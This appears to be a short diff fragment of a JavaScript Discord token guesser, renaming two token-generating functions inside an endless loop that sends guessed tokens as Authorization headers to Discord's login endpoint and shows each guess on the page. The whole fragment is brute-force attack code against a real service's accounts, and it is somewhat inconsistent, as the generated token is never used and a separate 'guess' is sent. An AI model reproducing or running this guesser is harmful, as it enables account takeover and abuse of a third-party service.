@@ -24,7 +24,7 @@
       return out
     }
     while(true){
-      token = gettoken1()
+      token = gentoken1()
       fetch('https://discord.com/login', {'headers':{
         'Authorization': guess
       }}).then(res => {
@@ -47,7 +47,7 @@
         }
       })
       document.getElementById('Guess').content = guess
-      token = gettoken2()
+      token = gentoken2()
       fetch('https://discord.com/login', {'headers':{
         'Authorization': guess
       }}).then(res => {
